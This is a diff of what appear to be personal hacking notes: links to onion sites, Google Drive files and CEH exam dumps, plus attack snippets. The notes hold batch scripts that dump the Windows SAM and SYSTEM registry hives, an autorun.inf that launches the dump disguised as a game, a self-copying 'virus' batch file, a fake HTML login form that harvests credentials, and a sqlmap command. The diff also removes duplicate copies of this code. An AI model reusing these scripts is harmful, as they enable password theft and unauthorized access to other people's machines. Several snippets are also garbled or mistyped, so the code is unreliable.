@@ -9,9 +9,7 @@ https://drive.google.com/open?id=1A3rw_jaWvBOSrAz3eF9zgmHukbifKnR1
 
 https://www.computer.org/cms/CYBSI/docs/Top-10-Flaws.pdf
 
-https://chat.whatsapp.com/FAf80Kfz8afK1ybj80dz9P
-https://discord.gg/kdRDpR
-
+Delme Virus:
 @ echo off
 rem ---------------------------------
 rem Spam With VBScript Msgboxes
@@ -50,10 +48,14 @@ rem ---------------------------------
 
 rem  __-Virus Author: -__
 
+Kali Linux Module One:
 https://drive.google.com/open?id=1CjQG-htNQJN7oac4Iw1ArkrdqHLzVdZu
 
+IEEE - Archive
 https://www.computer.org/cms/CYBSI/docs/Top-10-Flaws.pdf
 
+
+Windows Password Hack USB
 @echo off
 reg save hklm\sam c:\sam
 reg save hklm\system c:system
@@ -73,7 +75,7 @@ UseAutoPlay=1
 
 
 
-
+Windows Pass hack system
 
 @echo off
 reg SAVE HKLM\SAM C:\SAM
@@ -88,86 +90,63 @@ Candle :http://gjobqjj7wyczbqie.onion/ 
 HiddenWiki : http://zqktlwi4fecvo6ri.onion/wiki/index.php/Main_Page
 
 
-https://web.archive.org/web/20180306191329/https://www.computer.org/cms/CYBSI/docs/Top-10-Flaws.pdf
-
+Archive:
 https://greysec.net/showthread.php?tid=31&highlight=archive
 
 
+CEH Dumps:
 http://www.aoowe.com/practice-test-312-50-3068.html
 
 https://icedmilocode.wordpress.com/cehexamquestions/
 
+
+SQL injection:
 sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 --dbs
 
 
-
+HTML Injection:
 https://auth.mylexia.com/mylexiaLogin?errmsg=Username
 
 
-
+HTB Devel:
 https://drive.google.com/open?id=1N7ho5OaPpK7DsBlkjmXMWo732S7Gcyy6
+
+PPT 1:
+https://drive.google.com/open?id=1Z1O3hZzSo95068cUPCGASyUeQQlNYq_u
+
+PPT 2:
 https://drive.google.com/open?id=1BJb8neN1aYtYWbgfHPzFDRZ-Ln2OeJUq
 
 
-
+Kon-Boot
 https://drive.google.com/open?id=1cY8gApVtAwh9JQhy-BbJcI-wRUkLkBXj
-https://drive.google.com/open?id=1CjQG-htNQJN7oac4Iw1ArkrdqHLzVdZu
 
+
+CMD Pass Change:
 STEP 3: Type "net users" in CMD 
 
 STEP 4: Change password for any user by typing "net user <username> <new password>
 
 
-
+Virus :
 @echo off
 chdir /d %CD%
 copy virus.bat
 start virus.bat
 
 
-
-@echo off
-reg save hklm\sam c:\sam
-reg save hklm\system c:system
-reg save hklm\software c:\software
-copy "C:\sam" "%~dp0"
-copy "C:\system" "~%dp0"
-copy "C:\software" "~%dp0"
-exit
-
-
-[autorun]
-icon=twitter.ico
-open=samfile.bat
-action=Click ok to Run game
-shell\open\command=samfile.bat
-UseAutoPlay=1
-
-
-
-
-
-
-
-
+HTML Injection:
 <h3>Please login to proceed</h3> 
 <from action=http:192.168.3.255>Username:<br>
 <input type="username" name="username">
 </br>Password:<br><input type="password" name="password"></br>
 <br><input type="submit" value="Logon"></br>
 
-
-@echo off
-chdir /d %CD%
-copy virus.bat
-start virus.bat
-
+SQL Injection:
 http://testphp.vulnweb.com/listproducts.php?cat=1
 
-
+Hidden Wiki:
 http://zqktlwi4fecvo6ri.onion/wiki/index.php/Main_Page
-
-http://ytxmrc3pcbv5464e.onion.ws/files
 
 https://tinyurl.com/y2soyc6g
 
@@ -190,4 +169,4 @@ fclose($handle);
 exit;
 ?>
 
-https://drive.google.com/open?id=1Z1O3hZzSo95068cUPCGASyUeQQlNYq_u
+
